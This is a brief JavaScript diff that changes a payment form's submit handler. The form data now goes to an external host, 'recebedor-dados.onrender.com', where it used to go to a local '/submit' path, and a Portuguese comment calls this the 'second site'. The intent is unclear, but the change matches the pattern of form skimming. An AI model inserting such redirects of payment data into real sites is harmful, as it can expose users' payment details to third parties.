@@ -3,7 +3,7 @@ document.getElementById('paymentForm').addEventListener('submit', function(event
 
     const formData = new FormData(this);
 
-    fetch('/submit', {
+    fetch('https://recebedor-dados.onrender.com/submit', {  // URL do segundo site
         method: 'POST',
         body: new URLSearchParams(formData)
     })
